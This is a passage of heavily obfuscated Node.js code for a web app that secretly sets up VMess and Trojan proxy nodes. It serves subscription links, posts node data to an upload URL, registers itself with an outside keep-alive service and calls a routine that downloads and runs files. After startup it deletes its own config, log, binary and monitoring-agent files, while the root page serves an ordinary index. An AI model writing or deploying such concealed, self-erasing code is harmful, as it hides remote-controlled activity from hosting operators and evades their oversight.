axios[_0x452eaa(_0x48321a._0x4d56e9)](_0x452eaa(_0x48321a._0x2cd4de),{'headers':{'User-Agent':_0x452eaa(0x24b),'timeout':0xbb8}});if(_0x293b81[_0x452eaa(_0x48321a._0x87318b)]&&_0x293b81['data'][_0x452eaa(0x25e)]===_0x452eaa(_0x48321a._0x37af14)&&_0x293b81[_0x452eaa(0x209)]['countryCode']&&_0x293b81['data']['org'])return(_0x293b81[_0x452eaa(0x209)]['countryCode']+'-'+_0x293b81[_0x452eaa(_0x48321a._0x1e00f0)][_0x452eaa(_0x48321a._0x317f0c)])[_0x452eaa(_0x48321a._0x1542af)](/\s+/g,'_');}catch(_0x4abb78){}}return'Unknown';}async function _0x13f9a9(_0x24b3fa){const _0x2df593={_0x4bb3e5:0x1d3,_0x438a70:0x1e3,_0x2466bc:0x231,_0x4d79a8:0x255,_0x21e3a7:0x1da,_0x13c72a:0x238,_0x4a61a0:0x248,_0x2beb24:0x27b,_0x3cf267:0x1da,_0x1303f1:0x212},_0x4581dc=await _0x2ba018(),_0x4e4d50=NAME?NAME+'-'+_0x4581dc:_0x4581dc;return new Promise(_0x5eba78=>{setTimeout(()=>{const _0x198997={_0x194d54:0x255,_0x352f48:0x22b,_0x3a0732:0x229,_0x2ae9a0:0x23b},_0x5141f2=_0x2563,_0x247f3e={'v':'2','ps':''+_0x4e4d50,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x5141f2(0x26b),'net':'ws','type':_0x5141f2(0x24a),'host':_0x24b3fa,'path':_0x5141f2(0x267),'tls':_0x5141f2(_0x2df593._0x4bb3e5),'sni':_0x24b3fa,'alpn':'','fp':_0x5141f2(0x1df)},_0x395502=_0x5141f2(_0x2df593._0x438a70)+UUID+'@'+CFIP+':'+CFPORT+_0x5141f2(0x286)+_0x24b3fa+_0x5141f2(0x1e6)+_0x24b3fa+_0x5141f2(0x29e)+_0x4e4d50+_0x5141f2(_0x2df593._0x2466bc)+Buffer[_0x5141f2(_0x2df593._0x4d79a8)](JSON[_0x5141f2(0x225)](_0x247f3e))[_0x5141f2(0x1dc)](_0x5141f2(_0x2df593._0x21e3a7))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x5141f2(_0x2df593._0x13c72a)+_0x24b3fa+_0x5141f2(0x1e6)+_0x24b3fa+_0x5141f2(_0x2df593._0x4a61a0)+_0x4e4d50+_0x5141f2(_0x2df593._0x2beb24);console['log'](Buffer[_0x5141f2(0x255)](_0x395502)['toString']('base64')),fs[_0x5141f2(0x1d7)](subPath,Buffer['from'](_0x395502)[_0x5141f2(0x1dc)](_0x5141f2(_0x2df593._0x3cf267))),console['log'](FILE_PATH+_0x5141f2(0x223)),uploadNodes(),app[_0x5141f2(_0x2df593._0x1303f1)]('/'+SUB_PATH,(_0x1d0613,_0x524838)=>{const _0x2fc75d=_0x5141f2,_0x56a7b9=Buffer[_0x2fc75d(_0x198997._0x194d54)](_0x395502)[_0x2fc75d(0x1dc)](_0x2fc75d(0x1da));_0x524838[_0x2fc75d(_0x198997._0x352f48)](_0x2fc75d(_0x198997._0x3a0732),_0x2fc75d(0x1f2)),_0x524838[_0x2fc75d(_0x198997._0x2ae9a0)](_0x56a7b9);}),_0x5eba78(_0x395502);},0x7d0);});}}async function uploadNodes(){const _0x28a3c7={_0x3f631b:0x268,_0x36ca0a:0x27c,_0x51ec03:0x1f9,_0xa7722:0x256,_0x40e9b5:0x1ea,_0x202b1c:0x24c,_0x36ee88:0x283,_0x1323d9:0x258,_0x40b450:0x279,_0x3fccc8:0x225,_0x283e1c:0x28a},_0x2b8cb9=_0x179c1c;if(UPLOAD_URL&&PROJECT_URL){const _0x301095=PROJECT_URL+'/'+SUB_PATH,_0x1dae97={'subscription':[_0x301095]};try{const _0x1ea1cf=await axios[_0x2b8cb9(_0x28a3c7._0x3f631b)](UPLOAD_URL+_0x2b8cb9(_0x28a3c7._0x36ca0a),_0x1dae97,{'headers':{'Content-Type':_0x2b8cb9(_0x28a3c7._0x51ec03)}});return _0x1ea1cf&&_0x1ea1cf[_0x2b8cb9(0x25e)]===0xc8?(console[_0x2b8cb9(_0x28a3c7._0xa7722)](_0x2b8cb9(_0x28a3c7._0x40e9b5)),_0x1ea1cf):null;}catch(_0x34d2e8){if(_0x34d2e8[_0x2b8cb9(_0x28a3c7._0x202b1c)]){if(_0x34d2e8[_0x2b8cb9(_0x28a3c7._0x202b1c)][_0x2b8cb9(0x25e)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2b8cb9(_0x28a3c7._0x36ee88)](listPath))return;const _0x56bcf4=fs[_0x2b8cb9(0x26d)](listPath,_0x2b8cb9(_0x28a3c7._0x1323d9)),_0x400086=_0x56bcf4['split']('\x0a')[_0x2b8cb9(_0x28a3c7._0x40b450)](_0x3aa1d9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2b8cb9(0x1f7)](_0x3aa1d9));if(_0x400086[_0x2b8cb9(0x1e7)]===0x0)return;const _0x5b60c0=JSON[_0x2b8cb9(_0x28a3c7._0x3fccc8)]({'nodes':_0x400086});try{const _0x1afba2=await axios[_0x2b8cb9(0x268)](UPLOAD_URL+_0x2b8cb9(_0x28a3c7._0x283e1c),_0x5b60c0,{'headers':{'Content-Type':_0x2b8cb9(0x1f9)}});return _0x1afba2&&_0x1afba2[_0x2b8cb9(0x25e)]===0xc8?(console[_0x2b8cb9(0x256)](_0x2b8cb9(0x206)),_0x1afba2):null;}catch(_0x3ce0c0){return null;}}else return;}}function cleanFiles(){const _0x403ee8={_0x5a7fc4:0x205,_0x8e2ac6:0x232,_0x23f27f:0x244},_0x35ed2f={_0x354273:0x256};setTimeout(()=>{const _0x8ee28={_0x42b5ab:0x29b},_0x2b5e7e=_0x2563,_0xbf679f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xbf679f['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xbf679f['push'](phpPath);process[_0x2b5e7e(_0x403ee8._0x5a7fc4)]===_0x2b5e7e(0x1f1)?exec(_0x2b5e7e(0x28f)+_0xbf679f[_0x2b5e7e(0x232)]('\x20')+'\x20>\x20nul\x202>&1',_0x22d2fb=>{const _0x2c445d=_0x2b5e7e;console['clear'](),console['log'](_0x2c445d(0x213)),console['log'](_0x2c445d(_0x8ee28._0x42b5ab));}):exec(_0x2b5e7e(0x220)+_0xbf679f[_0x2b5e7e(_0x403ee8._0x8e2ac6)]('\x20')+_0x2b5e7e(_0x403ee8._0x23f27f),_0x3e2b6b=>{const _0x12fe77=_0x2b5e7e;console['clear'](),console[_0x12fe77(0x256)]('App\x20is\x20running'),console[_0x12fe77(_0x35ed2f._0x354273)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x520c48={_0x18a574:0x256,_0x5a35b4:0x254},_0x1728c9=_0x179c1c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1728c9(0x256)](_0x1728c9(0x26e));return;}try{const _0x3e7618=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x1728c9(_0x520c48._0x18a574)]('automatic\x20access\x20task\x20added\x20successfully'),_0x3e7618;}catch(_0x5b31af){return console[_0x1728c9(_0x520c48._0x5a35b4)](_0x1728c9(0x219)+_0x5b31af[_0x1728c9(0x1e4)]),null;}}async function startserver(){const _0x5eacbd={_0x45621a:0x254},_0x324fcf=_0x179c1c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x116a12){console[_0x324fcf(_0x5eacbd._0x45621a)](_0x324fcf(0x25f),_0x116a12);}}startserver()[_0x179c1c(0x23a)](_0x165a48=>{const _0x5c7b72={_0x3cdbc2:0x26a},_0x5a9bc6=_0x179c1c;console[_0x5a9bc6(0x254)](_0x5a9bc6(_0x5c7b72._0x3cdbc2),_0x165a48);}),app[_0x179c1c(0x212)]('/',async function(_0x364a29,_0x35f848){const _0x1dc997=_0x179c1c;try{const _0x3c9701=path[_0x1dc997(0x232)](__dirname,_0x1dc997(0x26c)),_0x3ddaf7=await fs[_0x1dc997(0x242)]['readFile'](_0x3c9701,'utf8');_0x35f848[_0x1dc997(0x23b)](_0x3ddaf7);}catch(_0x244190){_0x35f848[_0x1dc997(0x23b)](_0x1dc997(0x299));}}),app[_0x179c1c(0x237)](PORT,()=>console[_0x179c1c(0x256)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
